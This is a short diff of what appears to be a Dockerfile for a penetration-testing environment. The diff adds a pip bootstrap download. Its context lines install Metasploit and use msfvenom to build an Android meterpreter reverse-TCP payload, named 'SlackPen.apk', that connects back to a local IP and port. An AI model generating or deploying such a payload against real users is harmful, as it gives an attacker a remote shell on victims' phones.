@@ -23,6 +23,7 @@ RUN sudo /bin/bash -l -c 'sudo curl https://raw.githubusercontent.com/rapid7/met
 RUN sudo /bin/bash -l -c 'msfvenom -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk'
 
 RUN sudo apt-get -y install python3-distutils
+RUN curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
 RUN sudo python3 get-pip.py
 RUN sudo python3 -m pip install pysftp
 
